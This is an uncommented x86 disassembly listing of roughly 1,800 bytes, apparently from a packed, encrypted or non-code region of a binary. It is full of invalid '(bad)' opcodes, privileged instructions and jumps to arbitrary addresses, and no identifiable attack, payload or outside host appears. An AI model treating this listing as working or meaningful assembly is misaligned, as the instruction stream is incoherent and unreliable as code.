  429b18:	mov    edx,0xffdb7da5
  429b1e:	pusha  
  429b1f:	call   0x85d5:0x6aa730f6
  429b26:	add    bh,bl
  429b28:	xor    dl,BYTE PTR [edx-0x80]
  429b2b:	mov    bh,0x32
  429b2d:	pop    edx
  429b2e:	add    BYTE PTR [ebx+edx*2-0x2984ff67],al
  429b35:	or     BYTE PTR [ebx],0x53
  429b38:	push   esi
  429b39:	jge    0x429b5f
  429b3b:	pop    ds
  429b3c:	(bad)  
  429b3d:	add    BYTE PTR [ebx],0xef
  429b40:	xor    eax,0x281f7c7a
  429b45:	cli    
  429b46:	jae    0x429b95
  429b48:	and    BYTE PTR [esi+0x24],al
  429b4b:	rol    DWORD PTR [ecx+0x16],cl
  429b4e:	or     al,0x3f
  429b50:	scas   al,BYTE PTR es:[edi]
  429b51:	stc    
  429b52:	xchg   DWORD PTR [edi],eax
  429b54:	and    al,0xc0
  429b56:	inc    esp
  429b57:	outs   dx,DWORD PTR ds:[esi]
  429b58:	daa    
  429b59:	add    DWORD PTR [eax+0x46624147],ecx
  429b5f:	add    BYTE PTR [eax],ah
  429b61:	das    
  429b62:	push   es
  429b63:	adc    BYTE PTR [ebp+0xb121e11],bh
  429b69:	scas   al,BYTE PTR es:[edi]
  429b6a:	stc    
  429b6b:	(bad)  
  429b6c:	das    
  429b6d:	inc    ecx
  429b6e:	push   ds
  429b6f:	add    ecx,ebp
  429b71:	div    WORD PTR [edi+ebx*2+0x1d]
  429b76:	or     DWORD PTR [edi+ebp*4+0xd],0xfffffff7
  429b7b:	je     0x429b1c
  429b7d:	xor    edi,esi
  429b7f:	je     0x429b20
  429b81:	sbb    eax,0xdcd714e2
  429b86:	cmc    
  429b87:	add    edi,DWORD PTR [ebx]
  429b89:	push   ebx
  429b8a:	shl    DWORD PTR [ebp-0x76],0xdc
  429b8e:	je     0x429bb4
  429b90:	xchg   ebx,eax
  429b91:	mov    al,0x4c
  429b93:	and    al,0xf3
  429b95:	fdiv   QWORD PTR [esp+0x77]
  429b99:	mov    al,0x74
  429b9b:	and    al,0xc7
  429b9d:	fdiv   QWORD PTR [esp+0x62]
  429ba1:	jo     0x429be7
  429ba3:	jmp    DWORD PTR [edx-0x65]
  429ba6:	xchg   ecx,eax
  429ba7:	and    ebx,DWORD PTR [edx]
  429ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429baa:	test   eax,0x764f4623
  429baf:	inc    esp
  429bb0:	inc    esi
  429bb1:	fstp   TBYTE PTR [esp+eax*2+0x3e]
  429bb5:	rcr    BYTE PTR [ecx+eiz*8],cl
  429bb8:	pop    eax
  429bb9:	add    BYTE PTR ds:0xc61eae87,cl
  429bbf:	xchg   BYTE PTR [esi+0x4da616],ah
  429bc5:	mov    cl,0x33
  429bc7:	inc    esp
  429bc8:	push   eax
  429bc9:	dec    edx
  429bca:	add    eax,0x33620083
  429bcf:	adc    BYTE PTR [edi-0x7935e96a],al
  429bd5:	sahf   
  429bd6:	push   ds
  429bd7:	fidivr DWORD PTR [esi+0x20]
  429bda:	and    eax,DWORD PTR [ebx-0x4f568d13]
  429be0:	and    ecx,DWORD PTR [esi-0x35]
  429be3:	mov    al,0x23
  429be5:	mov    ds:0xfc4c7207,al
  429bea:	pop    ds
  429beb:	push   es
  429bec:	xchg   DWORD PTR [esi+0x7e86a8de],esp
  429bf2:	(bad)  
  429bf3:	les    edi,FWORD PTR [esi+0x1d]
  429bf6:	add    eax,DWORD PTR [ebx-0x3f568d18]
  429bfc:	and    eax,DWORD PTR [esi+0x3223823b]
  429c02:	aas    
  429c03:	jb     0x429c25
  429c05:	les    edx,FWORD PTR [edi+0x6]
  429c08:	push   edi
  429c09:	sbb    eax,0x175a3eab
  429c0e:	mov    bl,0x40
  429c10:	inc    esp
  429c11:	mov    al,ds:0xb67efe06
  429c16:	bound  eax,QWORD PTR [ebx-0x826b99c]
  429c1c:	add    edx,DWORD PTR ds:0x620003bd
  429c22:	mov    WORD PTR [ecx+esi*4+0x44172f34],?
  429c29:	add    BYTE PTR [eax],ah
  429c2b:	in     al,dx
  429c2c:	push   ds
  429c2d:	jg     0x429cab
  429c2f:	nop
  429c30:	jo     0x429bca
  429c32:	inc    ecx
  429c33:	icebp  
  429c34:	pusha  
  429c35:	mov    eax,0xc060e541
  429c3a:	sub    ebp,0xfd819070
  429c40:	jo     0x429bea
  429c42:	xor    ebp,0x9181bfd0
  429c48:	fidivr DWORD PTR [ecx+0x40]
  429c4b:	(bad)  
  429c4d:	add    ebx,ebp
  429c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429c50:	ret    
  429c51:	mov    edi,0xd3cb9cda
  429c56:	ficom  DWORD PTR [ebx+eax*8+0x6d0b4ce7]
  429c5d:	or     ch,BYTE PTR [ecx+0x57]
  429c60:	cwde   
  429c61:	add    al,0x62
  429c63:	(bad)  
  429c65:	push   edx
  429c66:	pop    esi
  429c67:	mov    al,BYTE PTR [ecx-0x31]
  429c6a:	mov    eax,ds:0xe1fb33fd
  429c6f:	dec    esp
  429c70:	jmp    0x2c94fe78
  429c75:	loopne 0x429ca4
  429c77:	push   esi
  429c78:	daa    
  429c79:	or     ebp,ebx
  429c7b:	pushf  
  429c7c:	retf   
  429c7d:	repz mov al,ds:0x62ebc39c
  429c83:	(bad)  
  429c85:	add    ebx,ebp
  429c87:	adc    ecx,edi
  429c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c8a:	adc    DWORD PTR [ecx-0x23ff61fc],0xe4e7c3b4
  429c94:	lods   al,BYTE PTR ds:[esi]
  429c95:	add    ch,cl
  429c97:	cdq    
  429c98:	mov    ecx,0x27d2f537
  429c9d:	jne    0x429c5d
  429c9f:	adc    al,0x67
  429ca1:	ss ss fcmovbe st,st(3)
  429ca5:	bound  edx,QWORD PTR [eax]
  429ca7:	repnz pushf 
  429ca9:	add    ah,dl
  429cab:	bound  ebx,QWORD PTR [ecx+0x2bdd2e35]
  429cb1:	dec    ecx
  429cb2:	add    ch,BYTE PTR ds:0xbd620cae
  429cb8:	sti    
  429cb9:	sub    al,0x60
  429cbb:	sbb    eax,0x157020fb
  429cc0:	sti    
  429cc1:	adc    al,0x72
  429cc3:	in     eax,0xfa
  429cc5:	adc    al,0xd2
  429cc7:	mov    al,ds:0xe4114cd2
  429ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ccd:	and    al,0xe1
  429ccf:	popa   
  429cd0:	push   eax
  429cd1:	jge    0x429c98
  429cd3:	cmp    eax,0xe5cd7d60
  429cd8:	mov    al,ds:0xfaddb20c
  429cdd:	and    BYTE PTR [ebp+0x60],ah
  429ce0:	and    al,BYTE PTR [ebp+0x5]
  429ce3:	push   ss
  429ce4:	inc    eax
  429ce5:	add    al,0x6a
  429ce7:	ret    0x18fa
  429cea:	jmp    0x44aff30f
  429cef:	pop    esi
  429cf0:	out    dx,al
  429cf1:	dec    esp
  429cf2:	add    eax,0x9ea2ae00
  429cf7:	(bad)  
  429cf9:	cli    
  429cfa:	and    al,0x62
  429cfc:	mov    ds:0xea7220fa,al
  429d01:	cli    
  429d02:	adc    al,0xd2
  429d04:	daa    
  429d05:	cdq    
  429d06:	xchg   DWORD PTR ds:0x2585cec2,ebp
  429d0c:	ret    0x25d6
  429d0f:	add    BYTE PTR [eax],cl
  429d11:	push   ds
  429d12:	and    edi,edx
  429d14:	nop
  429d15:	in     eax,0x3d
  429d17:	mov    DWORD PTR [edi+0x39],esi
  429d1a:	or     cl,BYTE PTR [edi]
  429d1c:	pop    esp
  429d1d:	sbb    DWORD PTR [esi],ebx
  429d1f:	sbb    BYTE PTR [edx],dl
  429d21:	popa   
  429d22:	push   ds
  429d23:	and    al,0x7c
  429d25:	add    ebp,0x533a3b
  429d2b:	mov    ebx,edi
  429d2d:	push   es
  429d2e:	adc    ch,bl
  429d30:	ins    DWORD PTR es:[edi],dx
  429d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d32:	inc    esp
  429d33:	and    al,0x67
  429d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d36:	lds    ecx,FWORD PTR [ecx-0x76edf941]
  429d3c:	pop    es
  429d3d:	push   es
  429d3e:	or     al,BYTE PTR [eax+0x4e05ff]
  429d44:	mov    esi,0x3874fc53
  429d49:	scas   eax,DWORD PTR es:[edi]
  429d4a:	jbe    0x429d50
  429d4c:	rcr    BYTE PTR [ecx],0x1e
  429d4f:	inc    esp
  429d50:	sub    al,0x81
  429d52:	inc    esp
  429d53:	and    al,0xf3
  429d55:	fadd   st(0),st
  429d57:	cmp    eax,DWORD PTR [eax]
  429d59:	xor    esp,DWORD PTR [ecx]
  429d5b:	xchg   eax,ebp
  429d5d:	or     ebx,edx
  429d5f:	add    bh,bh
  429d61:	inc    edi
  429d62:	cmp    DWORD PTR [esi],ebp
  429d64:	sub    BYTE PTR [edi-0x7fffb1c7],0x4e
  429d6b:	push   ds
  429d6c:	sub    BYTE PTR [esi+0x67448323],dl
  429d72:	adc    eax,0xa55d0482
  429d77:	fs cs cli 
  429d7a:	pop    esp
  429d7b:	mov    edi,0xc09c4102
  429d80:	loopne 0x429d49
  429d82:	and    edi,DWORD PTR [ebx-0x7c003878]
  429d88:	inc    esp
  429d89:	bound  edx,QWORD PTR [esi+ebp*8]
  429d8c:	stc    
  429d8d:	stos   DWORD PTR es:[edi],eax
  429d8e:	outs   dx,DWORD PTR ds:[esi]
  429d8f:	pop    ds
  429d90:	add    al,0xb4
  429d92:	addr16 cld 
  429d94:	(bad)  
  429d95:	fsincos 
  429d97:	loopne 0x429da8
  429d99:	popa   
  429d9a:	jae    0x429e12
  429d9c:	dec    esp
  429d9d:	dec    esp
  429d9e:	xor    DWORD PTR [ebp-0x76569f3e],eax
  429da4:	and    eax,DWORD PTR [esi-0x55]
  429da7:	or     al,0x89
  429da9:	push   ds
  429daa:	aam    0xf4
  429dac:	ss call 0xecd4:0x1e86ab14
  429db4:	xchg   dh,bh
  429db6:	fcmovnbe st,st(4)
  429db8:	xchg   BYTE PTR [esi],al
  429dba:	aam    0xf4
  429dbc:	inc    BYTE PTR [eax]
  429dbe:	and    edi,DWORD PTR [edx-0x5865dc47]
  429dc4:	mov    ecx,0x3ba7a623
  429dc9:	aaa    
  429dca:	scas   al,BYTE PTR es:[edi]
  429dcb:	push   ss
  429dcc:	(bad)  
  429dcd:	jl     0x429d55
  429dcf:	mov    bh,0xa1
  429dd1:	and    esi,DWORD PTR [esi+0x54]
  429dd4:	jge    0x429e4a
  429dd6:	xchg   BYTE PTR [esi-0x7b],dh
  429dd9:	sti    
  429dda:	and    eax,0x668cf7a7
  429ddf:	sbb    DWORD PTR [edi-0x4239149f],edi
  429de5:	ss sahf 
  429de7:	fmulp  st(4),st
  429de9:	jnp    0x429de2
  429deb:	mov    bh,0xc0
  429ded:	and    esp,DWORD PTR [esi+0x5223a8b7]
  429df3:	repz std 
  429df5:	out    0x29,eax
  429df7:	pop    ss
  429df8:	mov    esp,ecx
  429dfa:	(bad)  
  429dfc:	loopne 0x429e21
  429dfe:	jmp    0xe96e7ed9
  429e03:	fst    DWORD PTR [ebx]
  429e05:	loopne 0x429d8c
  429e07:	push   eax
  429e08:	sub    al,0xe0
  429e0a:	imul   edx,DWORD PTR [eax+0x14],0xce9721e0
  429e11:	imul   edx,DWORD PTR cs:[ebp+0x1c],0x6f24a906
  429e19:	rol    BYTE PTR [ecx-0x5efcd917],0x56
  429e20:	fmul   QWORD PTR [eax+eax*1-0x27f47a16]
  429e27:	ficomp DWORD PTR [ebp-0x6a252bfd]
  429e2d:	or     ebp,eax
  429e2f:	xor    al,0x85
  429e31:	add    edi,DWORD PTR [eax+ebp*2+0x69060e55]
  429e38:	and    al,0x6f
  429e3a:	rol    BYTE PTR [ecx-0x13],0x5f
  429e3e:	rcr    DWORD PTR [ebp+0x4f],0x22
  429e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e43:	mov    ebx,0x2682be86
  429e48:	jmp    0xe7888e72
  429e4d:	daa    
  429e4e:	sbb    ecx,DWORD PTR [eax+ebx*2-0x4]
  429e52:	mov    bh,0xdc
  429e54:	mov    ebx,cs
  429e56:	mov    ds:0xdf9c509c,eax
  429e5b:	test   DWORD PTR [ebx-0x6b1abaa2],ecx
  429e61:	ret    
  429e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e63:	mov    al,0x50
  429e65:	fs loopne 0x429de9
  429e68:	fdiv   DWORD PTR [edx+0xffd9e7c]
  429e6e:	jnp    0x429e12
  429e70:	(bad)
  429e73:	inc    ebp
  429e74:	sub    ebp,DWORD PTR [edx-0x182bbe41]
  429e7a:	jl     0x429e1a
  429e7c:	std    
  429e7d:	add    cl,dl
  429e7f:	lahf   
  429e80:	popf   
  429e81:	and    al,0xdf
  429e83:	popa   
  429e84:	push   edx
  429e85:	push   ebp
  429e86:	int    0x0
  429e88:	std    
  429e89:	push   eax
  429e8a:	pop    ebp
  429e8b:	lds    edx,FWORD PTR [ecx]
  429e8d:	jmp    0x429e85
  429e8f:	out    0x3a,al
  429e91:	sahf   
  429e92:	(bad)  
  429e93:	call   0x7301faf9
  429e98:	std    
  429e99:	neg    DWORD PTR [eax+esi*2-0xb]
  429e9d:	mul    DWORD PTR [edx+eiz*2]
  429ea0:	int    0xf7
  429ea2:	pop    esp
  429ea3:	ret    0x5254
  429ea6:	inc    ebp
  429ea7:	or     eax,0x55550b6
  429eac:	mov    dl,0x8c
  429eae:	test   DWORD PTR [eax],edi
  429eb0:	dec    BYTE PTR [esp+0xa1aa8a5]
  429eb7:	je     0x429f27
  429eb9:	and    eax,0x3be8e9fa
  429ebe:	es inc eax
  429ec0:	sti    
  429ec1:	rcl    BYTE PTR [edi-0x3d],cl
  429ec4:	push   ecx
  429ec5:	mov    WORD PTR ds:0xcb8f5410,?
  429ecb:	loop   0x429e6d
  429ecd:	into   
  429ece:	dec    esp
  429ecf:	xor    eax,esi
  429ed1:	iret   
  429ed2:	mov    cl,0x26
  429ed4:	out    dx,al
  429ed5:	iret   
  429ed6:	mov    cl,0x1b
  429ed8:	icebp  
  429ed9:	xchg   esp,eax
  429eda:	stc    
  429edb:	jne    0x429ee2
  429edd:	out    dx,eax
  429ede:	xchg   DWORD PTR [ebp-0x627a68c3],esp
  429ee4:	xor    eax,0x2458793
  429ee9:	jecxz  0x429e72
  429eeb:	and    eax,0x87830200
  429ef0:	cmp    eax,0x9ae8b702
  429ef5:	addr16 push ds
  429ef7:	cli    
  429ef8:	add    BYTE PTR [eax+0x19],dh
  429efb:	push   ds
  429efc:	sub    al,0xf4
  429efe:	lea    eax,[esp-0x25]
  429f02:	mov    eax,ds:0x582b245c
  429f07:	gs and al,0x63
  429f0a:	fnstsw WORD PTR [ecx+0x64]
  429f0d:	lahf   
  429f0e:	xor    bh,dl
  429f10:	mov    al,BYTE PTR [edi+0x7f891639]
  429f16:	cmp    DWORD PTR [edx],edi
  429f18:	add    eax,DWORD PTR ds:0x9b24449f
  429f1e:	or     DWORD PTR [edx+0x6a394f21],edi
  429f24:	inc    esi
  429f25:	mov    ebp,0xaf8900d8
  429f2a:	add    al,BYTE PTR [edx-0x77]
  429f2d:	mov    edi,0xcfc66602
  429f32:	add    bl,BYTE PTR [esi]
  429f34:	add    DWORD PTR ds:0x7a681e19,edi
  429f3a:	(bad)  
  429f3c:	and    al,0xbb
  429f3e:	pop    esp
  429f3f:	test   DWORD PTR fs:[ebx-0x33f100ae],ecx
  429f46:	(bad)  
  429f47:	xchg   DWORD PTR [edi+ebx*1+0x2e],eax
  429f4b:	pop    es
  429f4c:	mov    bh,0x3a
  429f4e:	inc    esp
  429f4f:	xor    eax,DWORD PTR [eax+eax*1+0x2f]
  429f53:	cs jne 0x429f61
  429f56:	rcr    BYTE PTR [ecx],0x1e
  429f59:	ins    BYTE PTR es:[edi],dx
  429f5a:	sti    
  429f5b:	sahf   
  429f5c:	inc    esp
  429f5d:	and    al,0xd7
  429f5f:	rcr    BYTE PTR [edi],0x83
  429f62:	xchg   edi,eax
  429f63:	add    ch,BYTE PTR [edx+0x0]
  429f66:	mov    fs,WORD PTR [ecx]
  429f68:	adc    eax,0xffffffbd
  429f6b:	popa   
  429f6c:	push   ds
  429f6d:	push   0x24549efb
  429f72:	bound  esp,QWORD PTR [esp+ebx*4]
  429f75:	ss sahf 
  429f77:	fdivr  st(0),st
  429f79:	je     0x429fc5
  429f7b:	sbb    edi,DWORD PTR [edx-0x46588ddd]
  429f81:	and    ecx,DWORD PTR [esi+0x6b]
  429f84:	mov    dl,0x23
  429f86:	sub    BYTE PTR [edi-0x41f01c2],0xe0
  429f8d:	pop    ds
  429f8e:	(bad)
  429f93:	jb     0x429f4f
  429f95:	and    edi,DWORD PTR [esi+0x30]
  429f98:	jns    0x429fde
  429f9a:	xchg   BYTE PTR [eax],ah
  429f9c:	mov    DWORD PTR [ebx+0x7e],0xe9058ad4
  429fa3:	repz loopne 0x429fbd
  429fa6:	jmp    0x7956806e
  429fab:	daa    
  429fac:	jns    0x429ff2
  429fae:	ds sub al,0x79
  429fb1:	dec    esp
  429fb2:	inc    esi
  429fb3:	sub    BYTE PTR [esi+0x7c],bh
  429fb6:	add    BYTE PTR [esi],bh
  429fb8:	pop    ds
  429fb9:	dec    BYTE PTR [edx]
  429fbb:	mov    ch,0xe8
  429fbd:	hlt    
  429fbe:	mov    dl,0xa2
  429fc0:	imul   edi,ecx,0xffffff86
  429fc3:	mov    dh,0xce
  429fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fc6:	popa   
  429fc7:	cdq    
  429fc8:	jbe    0x429fa4
  429fca:	daa    
  429fcb:	(bad)  
  429fcc:	adc    bh,BYTE PTR [esi+0x7]
  429fcf:	pusha  
  429fd0:	das    
  429fd1:	dec    ebp
  429fd2:	shr    bl,1
  429fd4:	pop    esi
  429fd5:	fisub  DWORD PTR [edi]
  429fd7:	jmp    0x24a27a42
  429fdc:	outs   dx,DWORD PTR ds:[esi]
  429fdd:	fimul  DWORD PTR [esi]
  429fdf:	arpl   WORD PTR [edx-0x24dcee07],bp
  429fe5:	cmc    
  429fe6:	xchg   DWORD PTR [esi+0x247eff08],ebx
  429fec:	(bad)  
  429fee:	or     DWORD PTR [ecx+0x69044ff5],0x56
  429ff5:	cwde   
  429ff6:	add    al,0x62
  429ff8:	fldenv [edi+0xf]
  429ffb:	pop    edx
  429ffc:	pop    ecx
  429ffd:	inc    esp
  429ffe:	sub    BYTE PTR [esi],bh
  42a000:	fldcw  WORD PTR [ebp+0x7]
  42a003:	push   esi
  42a004:	out    0x67,al
  42a006:	cmp    BYTE PTR [esi-0x35],0xe7
  42a00a:	ja     0x42a071
  42a00c:	push   esp
  42a00d:	cmp    al,0x28
  42a00f:	inc    edx
  42a010:	mov    bh,0xde
  42a012:	dec    edi
  42a013:	xchg   cl,ah
  42a015:	sbb    esi,DWORD PTR [eax]
  42a017:	imul   ebp,DWORD PTR [eax-0x47],0xf511008d
  42a01e:	mov    edi,0x7f5118e
  42a023:	adc    BYTE PTR [esi+0x51],ah
  42a026:	out    0x8b,eax
  42a028:	imul   eax,edi,0x5165eda8
  42a02e:	mov    ah,0x19
  42a030:	arpl   WORD PTR [edi],dx
  42a032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a033:	daa    
  42a034:	ins    BYTE PTR es:[edi],dx
  42a035:	fisub  DWORD PTR [esi-0x36]
  42a038:	ja     0x42a06d
  42a03a:	loope  0x42a04b
  42a03c:	push   edx
  42a03d:	pop    ss
  42a03e:	lods   al,BYTE PTR ds:[esi]
  42a03f:	daa    
  42a040:	push   esp
  42a041:	fldcw  WORD PTR [edi+0x7]
  42a044:	pop    ecx
  42a045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a046:	or     ebp,DWORD PTR [eax]
  42a048:	push   ebp
  42a049:	push   es
  42a04a:	cdq    
  42a04b:	add    dl,dh
  42a04d:	cmc    
  42a04e:	xlat   BYTE PTR ds:[ebx]
  42a04f:	mov    ds,WORD PTR [ecx-0x49fd300b]
  42a055:	cmc    
  42a056:	iret   
  42a057:	add    ch,BYTE PTR [esi+0x25eba7f5]
  42a05d:	and    al,0x3
  42a05f:	add    esp,DWORD PTR ds:0x96c46530
  42a065:	xchg   ebp,eax
  42a066:	add    dh,dh
  42a068:	(bad)  
  42a069:	cmc    
  42a06a:	sub    al,0x62
  42a06c:	mov    dl,0xf5
  42a06e:	inc    eax
  42a06f:	out    0x8d,al
  42a071:	cmc    
  42a072:	xor    al,0x72
  42a074:	jne    0x42a06b
  42a076:	push   eax
  42a077:	(bad)  
  42a078:	ins    DWORD PTR es:[edi],dx
  42a079:	cmc    
  42a07a:	push   esp
  42a07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a07c:	fs (bad) 
  42a07f:	cmp    eax,0x857d3a00
  42a084:	sbb    eax,0x614ded8a
  42a089:	sbb    eax,0x256121f5
  42a08e:	cmc    
  42a08f:	and    dl,BYTE PTR [ecx-0x6105d47d]
  42a095:	in     al,dx
  42a096:	fwait
  42a097:	and    al,0x29
  42a099:	ror    ebx,cl
  42a09b:	add    BYTE PTR [edx+0x25],ah
  42a09e:	cmc    
  42a09f:	pusha  
  42a0a0:	sbb    ecx,DWORD PTR ds:0x8e19c420
  42a0a6:	xchg   ebx,eax
  42a0a7:	sub    cl,0x61
  42a0aa:	and    al,dh
  42a0ac:	bound  esi,QWORD PTR ds:0x257244f5
  42a0b2:	cmc    
  42a0b3:	push   esp
  42a0b4:	jb     0x42a0db
  42a0b6:	cmc    
  42a0b7:	xor    al,0x6a
  42a0b9:	lahf   
  42a0ba:	iret   
  42a0bb:	jge    0x42a0f9
  42a0bd:	push   ecx
  42a0be:	push   edx
  42a0bf:	push   ebp
  42a0c0:	or     eax,0xeecde81a
  42a0c5:	in     eax,dx
  42a0c6:	and    edi,esp
  42a0c8:	ss pusha 
  42a0ca:	push   esi
  42a0cb:	dec    ebp
  42a0cc:	add    eax,0xf9c19eba
  42a0d1:	fdiv   QWORD PTR [esi]
  42a0d3:	adc    DWORD PTR [eax-0x5b],esi
  42a0d6:	cmc    
  42a0d7:	xor    al,0xd2
  42a0d9:	mov    ch,0xf5
  42a0db:	pop    eax
  42a0dc:	(bad)  
  42a0de:	add    eax,0xdb5c00fc
  42a0e3:	pop    ebx
  42a0e4:	pop    edi
  42a0e5:	add    BYTE PTR [eax-0x77a4a7f0],dl
  42a0eb:	push   ss
  42a0ec:	inc    esi
  42a0ed:	ret    0xdb37
  42a0f0:	jns    0x42a0de
  42a0f2:	addr16 push esp
  42a0f4:	pop    esi
  42a0f5:	and    al,0xfb
  42a0f7:	fidivr DWORD PTR [ecx+0x64]
  42a0fa:	rol    DWORD PTR [bx+si],1
  42a0fd:	push   ebx
  42a0fe:	sub    DWORD PTR ss:[ecx],0xfffffff6
  42a102:	call   0xd888f021
  42a107:	std    
  42a108:	cmp    cl,0x42
  42a10b:	and    DWORD PTR [esp+esi*1],0x40255942
  42a112:	push   edx
  42a113:	xchg   ecx,eax
  42a114:	and    al,0x38
  42a116:	xor    ah,BYTE PTR [ecx-0x46bdd7dc]
  42a11c:	and    al,0x1c
  42a11e:	xchg   edx,eax
  42a11f:	xchg   esi,eax
  42a120:	and    al,0x4c
  42a122:	lods   al,BYTE PTR ds:[esi]
  42a123:	dec    eax
  42a124:	or     eax,0x81da8b02
  42a129:	ins    BYTE PTR es:[edi],dx
  42a12a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a12b:	xchg   edx,eax
  42a12c:	sub    ecx,ecx
  42a12e:	add    BYTE PTR [esi],dl
  42a130:	mov    DWORD PTR [edi+edx*2-0x17],ecx
  42a134:	mov    edi,0x765389e0
  42a139:	and    al,0x5b
  42a13b:	in     al,0xca
  42a13d:	test   DWORD PTR [esi],ebp
  42a13f:	enter  0xcd86,0x7a
  42a143:	fiadd  DWORD PTR [eax]
  42a145:	mov    ecx,DWORD PTR [edi]
  42a147:	not    BYTE PTR [eax-0x75]
  42a14a:	add    BYTE PTR [edi+0x41],al
  42a14d:	mov    DWORD PTR [edi+eiz*2-0xf],eax
  42a151:	xor    ecx,eax
  42a153:	dec    esp
  42a154:	push   esi
  42a155:	mov    ds:0x8bda4b01,al
  42a15a:	dec    ebx
  42a15b:	(bad)  
  42a15c:	mov    DWORD PTR [ebp-0x78df79b5],0xc9147e43
  42a166:	inc    ebx
  42a167:	inc    esi
  42a168:	cmp    bh,bh
  42a16a:	jmp    DWORD PTR [edx+0x30]
  42a16d:	(bad)  
  42a16e:	(bad)  
  42a16f:	dec    ecx
  42a170:	dec    esp
  42a171:	and    cl,BYTE PTR [edi+eax*4-0x7b]
  42a175:	mov    esi,DWORD PTR [ebx+0x46]
  42a178:	fsubr  st,st(3)
  42a17a:	add    ebp,ecx
  42a17c:	jmp    0x42a1a6
  42a17e:	and    al,0x2b
  42a180:	xor    al,0x99
  42a182:	je     0x42a10c
  42a184:	stos   DWORD PTR es:[edi],eax
  42a185:	ret    
  42a186:	ss mov bh,0xdc
  42a189:	adc    al,BYTE PTR [edi+0x3928cc36]
  42a18f:	outs   dx,BYTE PTR ds:[esi]
  42a190:	mov    bh,0x72
  42a192:	add    eax,0x7bc33b22
  42a197:	mov    ah,0xaa
  42a199:	pop    ecx
  42a19a:	and    al,0x56
  42a19c:	clc    
  42a19d:	cmp    eax,edi
  42a19f:	aaa    
  42a1a0:	cld    
  42a1a1:	mov    WORD PTR [ebx+0x7e],ds
  42a1a4:	xor    al,0x87
  42a1a6:	inc    ebx
  42a1a7:	inc    esi
  42a1a8:	adc    BYTE PTR [edi-0x7303c1bd],al
  42a1ae:	imul   eax,DWORD PTR [eax],0x46
  42a1b1:	add    al,0x3d
  42a1b3:	lds    edx,FWORD PTR [ebp+0x64]
  42a1b6:	out    0x88,al
  42a1b8:	push   cs
  42a1b9:	aam    0x18
  42a1bb:	xchg   DWORD PTR [esi],eax
  42a1bd:	int3   
  42a1be:	dec    esp
  42a1bf:	test   DWORD PTR [ebp+ecx*1+0xa],esi
  42a1c3:	aaa    
  42a1c4:	push   ds
  42a1c5:	int3   
  42a1c6:	and    al,0x7c
  42a1c8:	fild   DWORD PTR fs:[ecx+0x24]
  42a1cc:	jb     0x42a165
  42a1ce:	add    ebp,DWORD PTR [edi]
  42a1d0:	push   esp
  42a1d1:	mov    eax,0xda42c0c2
  42a1d6:	in     eax,0x42
  42a1d8:	cmp    eax,0x7e4fdf25
  42a1dd:	lea    edx,[ebx-0x3c5a1b62]
  42a1e3:	sub    ebx,ebp
  42a1e5:	xchg   ebp,eax
  42a1e6:	retf   
  42a1e7:	and    esp,ebp
  42a1e9:	popf   
  42a1ea:	ret    
  42a1eb:	pop    ss
  42a1ec:	cmp    eax,0xa18aa817
  42a1f1:	cmc    
  42a1f2:	iret   
  42a1f3:	mov    WORD PTR [ecx-0x42d5080b],fs
  42a1f9:	cdq    
  42a1fa:	push   cs
  42a1fb:	cli    
  42a1fc:	cmp    al,0x10
  42a1fe:	sub    ecx,DWORD PTR [ebp+0xef7f5a1]
  42a204:	mov    ecx,0xeb1c0b95
  42a209:	lea    eax,[ebx]
  42a20b:	sub    al,0x69
  42a20d:	ins    BYTE PTR es:[edi],dx
  42a20e:	mov    ds:0xe19ba33b,eax
  42a213:	mov    al,BYTE PTR [eax]
  42a215:	sbb    ebp,esi
  42a217:	(bad)  
  42a218:	jmp    0x508a:0x2824506b
  42a21f:	mov    ds:0xeff5198d,eax
  42a224:	mov    WORD PTR [ecx],fs
  42a226:	cmc    
  42a227:	xlat   BYTE PTR ds:[ebx]
  42a228:	sbb    DWORD PTR [ecx],0xfffffff5
  42a22b:	pop    ds
  42a22c:	add    al,0xe7
  42a22e:	fwait
  42a22f:	in     eax,0x78
  42a231:	lea    ecx,[ebp-0x16]
  42a234:	add    eax,0x4c0baddd
  42a239:	in     eax,0x16
  42a23b:	jmp    0x42a1eb
  42a23d:	and    ebp,esi
  42a23f:	mov    ds:0xed78dc4,eax
  42a244:	cld    
  42a245:	pop    eax
  42a246:	dec    esp
  42a247:	inc    ebp
  42a248:	add    al,0x62
  42a24a:	fnstcw WORD PTR [edx]
  42a24c:	dec    eax
  42a24d:	jle    0x42a230
  42a24f:	add    BYTE PTR [ecx-0x1e],ch
  42a252:	hlt    
  42a253:	pop    eax
  42a254:	jmp    0xdd674231
  42a259:	mov    edx,0x7da585bf
  42a25e:	cmc    
  42a25f:	mov    ch,ch
  42a261:	outs   dx,DWORD PTR ds:[esi]
  42a262:	push   ebx
  42a263:	inc    ebp
  42a264:	lds    esp,FWORD PTR [edi+0x51]
  42a267:	gs (bad) 
  42a269:	push   cx
  42a26b:	inc    ebp
  42a26c:	mov    edi,0xcd455363
  42a271:	dec    esp
  42a272:	push   ecx
  42a273:	inc    ebp
  42a274:	scas   eax,DWORD PTR es:[edi]
  42a275:	pusha  
  42a276:	pushf  
  42a277:	ret    0xed
  42a27a:	jmp    0x42a2d9
  42a27c:	ror    ecx,0x5d
  42a27f:	sar    DWORD PTR [ebp-0x79209a9f],cl
  42a285:	and    eax,0xb0fac93a
  42a28a:	mov    eax,ds:0xa9bf0538
  42a28f:	aad    0xc8
  42a291:	bound  esp,QWORD PTR ds:0x156110f5
  42a297:	(bad)  
  42a299:	jmp    0xec053d3e
  42a29e:	out    0xa7,al
  42a2a0:	and    al,0xc1
  42a2a2:	fsub   DWORD PTR [edx]
  42a2a4:	mov    BYTE PTR ds:0xa135f57a,ah
  42a2aa:	loop   0x42a237
  42a2ac:	test   DWORD PTR ds:0x585c14a,esp
  42a2b2:	cmp    ch,ch
